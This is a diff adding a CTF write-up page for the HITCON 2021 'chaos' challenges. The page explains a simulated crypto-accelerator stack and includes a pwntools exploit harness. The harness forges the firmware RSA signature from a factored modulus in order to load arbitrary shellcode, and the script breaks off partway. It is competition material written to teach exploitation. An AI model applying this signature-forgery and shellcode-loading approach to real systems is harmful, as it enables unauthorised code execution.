@@ -1,0 +1,1246 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Chaos | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Chaos" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/HITCON-2021/pwn/chaos.html" />
+<meta property="og:url" content="https://org.anize.rs/HITCON-2021/pwn/chaos.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Chaos" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Chaos","url":"https://org.anize.rs/HITCON-2021/pwn/chaos.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="chaos">Chaos</h1>
+
+<p><strong>Authors</strong>: <a href="https://twitter.com/_MatteoRizzo">Nspace</a>, <a href="https://twitter.com/galli_leo_">gallileo</a></p>
+
+<p><strong>Tags</strong>: pwn, crypto, kernel, sandbox, heap</p>
+
+<p><strong>Points</strong>: 334 + 421 + 450</p>
+
+<blockquote>
+  <p>Let’s introduce our brand new device for this cryptocurrency era - CHAOS the CryptograpHy AcceleratOr Silicon!</p>
+
+  <p>Remote Env: Ubuntu 20.04</p>
+
+  <p><code class="language-plaintext highlighter-rouge">nc 52.197.161.60 3154</code></p>
+
+  <p><a href="https://hitcon-2021-quals.s3.ap-northeast-1.amazonaws.com/chaos-7e0d17f7553a86831ec6f1a5aba6bdb8cfab5674.tar.gz">chaos-7e0d17f7553a86831ec6f1a5aba6bdb8cfab5674.tar.gz</a></p>
+</blockquote>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Last week we played HITCON CTF 2021, one of the hardest events of the year, and placed 4th. During the CTF we (Nspace and gallileo) spent most of our time working on the chaos series of challenges written by <a href="https://twitter.com/david942j">david942j</a> and lyc. This writeup explains the structure of the challenges and discusses how we solved each of the 3 stages. Out of nearly 300 teams in the CTF, we were the only team to solve all 3 challenges, and the first team to solve chaos-kernel and chaos-sandbox.</p>
+
+<p>Let’s get started!</p>
+
+<h2 id="challenge-architecture">Challenge architecture</h2>
+
+<p>This series of challenges simulates a custom hardware cryptographic accelerator attached to a Linux computer. The setup is fairly complex and has a lot of moving parts:</p>
+
+<ul>
+  <li>A modified QEMU with a custom CHAOS PCI device. The virtual PCI device lets the guest interact with the emulated CHAOS chip.</li>
+  <li>A Linux VM running inside QEMU. The VM loads a driver for the CHAOS chip, called <code class="language-plaintext highlighter-rouge">chaos.ko</code>, into the kernel. Userspace programs can talk to CHAOS through the driver.</li>
+  <li>A userspace CHAOS client that uses CHAOS to perform cryptographic operations.</li>
+  <li>A firmware binary that runs on the emulated CHAOS chip.</li>
+  <li>A sandbox binary that emulates the CHAOS chip and runs the firmware.</li>
+</ul>
+
+<p>The following image shows an overview all the components and how they interact.</p>
+
+<p><img src="/HITCON-2021/pwn/chaos1.jpg" alt="CHAOS challenge architecture" /></p>
+
+<p>There are 3 challenges in the series, each with a different flag:</p>
+
+<ul>
+  <li>chaos-firmware (10 solves, 334 points): the flag is in a file outside the VM (<code class="language-plaintext highlighter-rouge">flag_fiwmare</code>).</li>
+  <li>chaos-kernel (3 solves, 421 points): the flag is in a file inside the VM that only root can read.</li>
+  <li>chaos-sandbox (2 solves, 450 points): the flag is in a file outside the VM (<code class="language-plaintext highlighter-rouge">flag_sandbox</code>).</li>
+</ul>
+
+<h3 id="chaos-virtual-device">CHAOS virtual device</h3>
+
+<p>CHAOS is a virtual cryptographic accelerator attached to the PCI bus of the virtual machine. It exposes 2 PCI memory resources to the VM: a MMIO area with 16 registers (<code class="language-plaintext highlighter-rouge">csrs</code>), and 1 MB of dedicated on-chip memory (<code class="language-plaintext highlighter-rouge">dram</code>). The VM can interact with CHAOS by reading and writing to these two memory regions and CHAOS can send interrupts to the VM. The implementation is split in 3 parts: a virtual PCI device in QEMU, a sandbox binary, and some firmware that runs on the virtual chip.</p>
+
+<p>The PCI device in QEMU doesn’t do much. At startup it allocates space for the two memory regions using <code class="language-plaintext highlighter-rouge">memfd</code> and launches the sandbox binary. The QEMU process and the sandbox share the two memfds and two eventfds used to signal interrupts. After startup, the virtual PCI device is only used to send interrupts to the VM or the sandbox and to handle the VM’s memory accesses.</p>
+
+<h3 id="chaos-sandbox">CHAOS sandbox</h3>
+
+<p>The sandbox does the actual chip emulation, so it’s more interesting. At startup it mmaps the two shared memory areas, opens two flag files (<code class="language-plaintext highlighter-rouge">flag_firmware</code> and <code class="language-plaintext highlighter-rouge">flag_sandbox</code>), and waits until the VM sends it the firmware. Once the VM sends the firmware, the sandbox validates it, forks, and runs the firmware in the child process. The sandbox ptraces the firmware process and uses <code class="language-plaintext highlighter-rouge">PTRACE_SYSEMU</code> to intercept all the system calls made by the firmware. The firmware’s system calls are not handled by the kernel, but by the sandbox. This lets the sandbox implement a custom syscall interface for the firmware, and prevents the firmware from directly accessing files or other system resources.</p>
+
+<p>The sandbox implements only a few system calls:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">exit</code> stops the firmware and sends the exit code back to the VM. The sandbox restarts the firmware on the next memory access from the VM.</li>
+  <li><code class="language-plaintext highlighter-rouge">add_key</code> and <code class="language-plaintext highlighter-rouge">delete_key</code> add and remove cryptographic keys supplied by the firmware to the sandbox’s key storage.</li>
+  <li><code class="language-plaintext highlighter-rouge">do_crypto</code> performs a cryptographic operation on data supplied by the firmware and returns the result to the firmware.</li>
+  <li><code class="language-plaintext highlighter-rouge">get_flag</code> reads <code class="language-plaintext highlighter-rouge">flag_firmware</code> into the chip’s memory.</li>
+</ul>
+
+<h3 id="chaos-firmware">CHAOS firmware</h3>
+
+<p>The firmware is a flat x86_64 binary, which runs in a child process of the sandbox. Since it runs under ptrace with <code class="language-plaintext highlighter-rouge">PTRACE_SYSEMU</code>, it cannot directly make system calls to the kernel, but must do so through the sandbox. The firmware is not executed with <code class="language-plaintext highlighter-rouge">execve</code>, but simply loaded in memory and jumped to. It executes in a copy of the sandbox’s memory space, so it has direct access to the MMIO area and the CHAOS device memory.
+The challenge has an example firmware, but also lets us provide our own firmware, which can be an arbitrary binary up to 10 kB in size. The sandbox will refuse to load a firmware image unless it passes a RSA signature check.</p>
+
+<h3 id="chaos-driver">CHAOS driver</h3>
+
+<p><code class="language-plaintext highlighter-rouge">chaos.ko</code> is a Linux kernel-mode driver that interfaces with the virtual CHAOS chip over PCI. It is responsible for managing the CHAOS chip’s memory, loading the firmware, servicing interrupts, and providing userspace programs with an interface to the CHAOS chip. The userspace interface uses a misc character device (<code class="language-plaintext highlighter-rouge">/dev/chaos</code>) and exposes two IOCTLs:</p>
+
+<ul>
+  <li>ALLOC_BUFFER allocates a buffer of a given size in the CHAOS chip’s memory. This can only be done once per open file. After calling this ioctl the client can access the buffer by mmapping the file descriptor.</li>
+  <li>DO_REQUEST sends a request to perform a cryptographic operation to the CHAOS chip, waits for the request to complete, and then returns.</li>
+</ul>
+
+<p>The chip side of the interface uses two ring buffers: a command queue and response queue. The command queue contains request descriptors, which specify what operation CHAOS should perform. Each request descriptor contains a pointer to the input data in the CHAOS memory, the size of the data, an opcode, and a request ID. The response queue contains response descriptors (request ID and status code). After enqueuing a new request, the driver signals a mailbox in the CHAOS MMIO area, which makes the sandbox run the firmware, and the blocks.</p>
+
+<p>When the firmware returns, the virtual PCI device raises an interrupt, which processes the request, then wakes up the request threads. When a blocked request thread sees that the chip completed its request, it unblocks and returns the result to userspace.</p>
+
+<h3 id="chaos-client">CHAOS client</h3>
+
+<p>The last piece is the client, a regular Linux binary which runs in userspace in the VM. The client can interact with CHAOS through the interface exposed by the driver at <code class="language-plaintext highlighter-rouge">/dev/chaos</code>. Just like with the firmware, the challenge provides an example client, but also lets us use our own which can be an arbitrary binary up to 1 MB in size. Unlike the firmware, the client doesn’t have to pass a signature check. The client runs as an unprivileged user, so it cannot read the flag inside the VM.</p>
+
+<h2 id="preparation">Preparation</h2>
+
+<p>Since the challenge setup is quite complex with a lot of moving parts, we wanted to reduce the complexity and make debugging easier. Since Part 1 and Part 3 can ignore the kernel module and QEMU for the most part, we wrote a script to launch the sandbox binary standalone.</p>
+
+<p>The setup is quite simple, we create the memfds and eventfds in python, then use <code class="language-plaintext highlighter-rouge">pwntools</code> to spawn the sandbox process. We also have some utility functions for “interacting” with the memory regions. The script shown below already uses part of the solution for Part 1. It also already contains more “advanced” firmware features we added for Part 3, being an output buffer so we can use <code class="language-plaintext highlighter-rouge">printf</code> inside the firmware.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1"># for type info in vscode
+</span><span class="kn">from</span> <span class="nn">pwnlib.tubes.process</span> <span class="kn">import</span> <span class="n">process</span>
+<span class="kn">from</span> <span class="nn">pwnlib</span> <span class="kn">import</span> <span class="n">gdb</span><span class="p">,</span> <span class="n">context</span>
+<span class="kn">from</span> <span class="nn">pwnlib.elf</span> <span class="kn">import</span> <span class="n">ELF</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">memfd</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
+<span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">prod</span>
+<span class="kn">from</span> <span class="nn">skein</span> <span class="kn">import</span> <span class="n">threefish</span>
+<span class="kn">import</span> <span class="nn">twofish</span>
+
+<span class="k">def</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">flags</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">memfd</span><span class="p">.</span><span class="n">memfd_create</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">flags</span><span class="p">)</span>
+
+<span class="c1"># whatever
+</span><span class="n">libc</span> <span class="o">=</span> <span class="n">cdll</span><span class="p">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">eventfd</span><span class="p">(</span><span class="n">init_val</span><span class="p">,</span> <span class="n">flags</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">libc</span><span class="p">.</span><span class="n">eventfd</span><span class="p">(</span><span class="n">init_val</span><span class="p">,</span> <span class="n">flags</span><span class="p">)</span>
+
+<span class="c1"># Set up pwntools for the correct architecture
+</span><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'sandbox'</span><span class="p">)</span>
+
+<span class="c1"># SETUP LOCAL ENV
+</span><span class="n">csr_fd</span> <span class="o">=</span> <span class="n">memfd_create</span><span class="p">(</span><span class="s">"dev-csr"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"csr_fd: %d"</span><span class="p">,</span> <span class="n">csr_fd</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">truncate</span><span class="p">(</span><span class="n">csr_fd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">)</span>
+<span class="n">dram_fd</span> <span class="o">=</span> <span class="n">memfd_create</span><span class="p">(</span><span class="s">"dev-dram"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"dram_fd: %d"</span><span class="p">,</span> <span class="n">dram_fd</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">truncate</span><span class="p">(</span><span class="n">dram_fd</span><span class="p">,</span> <span class="mh">0x100000</span><span class="p">)</span>
+<span class="n">evtfd_to_dev</span> <span class="o">=</span> <span class="n">eventfd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"evtfd_to_dev: %d"</span><span class="p">,</span> <span class="n">evtfd_to_dev</span><span class="p">)</span>
+<span class="n">evtfd_from_dev</span> <span class="o">=</span> <span class="n">eventfd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">preexec</span><span class="p">():</span>
+    <span class="c1"># WARNING: using log.* stuff inside the preexec functions can cause hangs, no idea why
+</span>    <span class="c1"># log.info("Before executing, setting up the filedescriptors")
+</span>    <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">csr_fd</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">dram_fd</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">evtfd_to_dev</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">evtfd_from_dev</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
+    <span class="c1"># log.info("Finished with duplicating filedesc")
+</span>
+<span class="k">def</span> <span class="nf">wait_for_interrupt</span><span class="p">():</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"Waiting for interrupt from device"</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">evtfd_from_dev</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"Got 0x%x"</span><span class="p">,</span> <span class="n">u64</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">send_interrupt</span><span class="p">(</span><span class="n">val</span> <span class="o">=</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"Sending interrupt with val 0x%x"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">evtfd_to_dev</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">write_mem</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"Writing to %d @ 0x%x: %s"</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">hexdump</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">SEEK_SET</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write_mem_64</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="n">write_mem</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">read_mem</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"Reading from %d @ 0x%x"</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">SEEK_SET</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read_mem_64</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">read_mem</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">load_firmware</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">dram_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Loading firmware of size 0x%x, dram @ 0x%x"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">dram_off</span><span class="p">)</span>
+    <span class="c1"># mapping firmware directly at beginning of dram, hopefully that's ok lmao
+</span>    <span class="n">write_mem</span><span class="p">(</span><span class="n">dram_fd</span><span class="p">,</span> <span class="n">dram_off</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">write_mem_64</span><span class="p">(</span><span class="n">csr_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dram_off</span><span class="p">)</span>
+    <span class="n">write_mem_64</span><span class="p">(</span><span class="n">csr_fd</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="n">send_interrupt</span><span class="p">()</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">wait_for_interrupt</span><span class="p">()</span>
+    <span class="n">int_val</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Got interrupt: 0x%x"</span><span class="p">,</span> <span class="n">int_val</span><span class="p">)</span> <span class="c1"># should be &gt; 0x1336
+</span>    <span class="n">load_res</span> <span class="o">=</span> <span class="n">read_mem_64</span><span class="p">(</span><span class="n">csr_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Got result for loading: 0x%x"</span><span class="p">,</span> <span class="n">load_res</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">build_firmware</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+    <span class="n">header</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x82</span><span class="p">)</span>
+    <span class="n">header</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"0fff0ee945bd4176f55a40543b3666843a0d565c339e5d8969fcd7ca921cc303a1c8af16240c4d032d1931632b90996dd48aebacee307d3c57bc83375698ae7df90d10163edee9e067ce46e738092257dafb15b80fb65961900deffa9b59b57e472bf56be0d9f648ad6908f2553be13a9ea0cda24317756cba5142a95e21f9e000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><span class="p">)</span>
+
+    <span class="n">factors</span> <span class="o">=</span> <span class="p">[</span><span class="mi">13</span><span class="p">,</span> <span class="mi">691267</span><span class="p">,</span> <span class="mi">20502125755394762434933579089125449307897345968084091731229436353808955447773787435286551243437724264561546459801643475331591701959705793105612360650011316069145033629055595572330904990306691542449400499839249687299626423918040370229280752606812185791663127069532707770334540305571214081730144598191170073</span>
+    <span class="p">]</span>
+    <span class="n">phi</span><span class="o">=</span><span class="n">prod</span><span class="p">([</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">factors</span><span class="p">])</span>
+    <span class="n">dec</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+    <span class="n">act</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">shellcode</span><span class="p">).</span><span class="n">digest</span><span class="p">(),</span> <span class="s">"little"</span><span class="p">)</span>
+    <span class="n">header</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">act</span><span class="p">,</span> <span class="n">dec</span><span class="p">,</span> <span class="n">prod</span><span class="p">(</span><span class="n">factors</span><span class="p">)),</span> <span class="mi">256</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">header</span> <span class="o">+</span> <span class="n">shellcode</span>
+
+<span class="n">OUT_OFF</span> <span class="o">=</span> <span class="mh">0x50000</span>
+
+<span class="k">def</span> <span class="nf">read_outputbuf</span><span class="p">():</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+    <span class="n">off</span> <span class="o">=</span> <span class="n">OUT_OFF</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">curr</span> <span class="o">=</span> <span class="n">read_mem</span><span class="p">(</span><span class="n">dram_fd</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">curr</span> <span class="o">==</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">curr</span>
+        <span class="n">off</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span>
+
+<span class="c1"># Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">preexec_fn</span><span class="o">=</span><span class="n">preexec</span><span class="p">,</span> <span class="n">close_fds</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1"># to allow attaching
+</span><span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">PAUSE</span><span class="p">:</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="n">DRAM_START</span> <span class="o">=</span> <span class="mh">0x10000000</span>
+
+<span class="c1"># sh = shellcraft.syscall(0xC89FC, arg0=DRAM_START + 0x1000)
+# sh += shellcraft.syscall(60, 0)
+</span>
+<span class="c1"># asm_sh = asm(sh)
+</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">subprocess</span><span class="p">.</span><span class="n">check_call</span><span class="p">([</span><span class="s">'make'</span><span class="p">])</span>
+<span class="n">firm</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="s">"./firmware"</span><span class="p">)</span>
+<span class="c1"># firm = build_firmware(asm_sh)
+</span><span class="n">load_firmware</span><span class="p">(</span><span class="n">firm</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Firmware read ok =&gt; launching firmware now!"</span><span class="p">)</span>
+<span class="n">send_interrupt</span><span class="p">()</span>
+
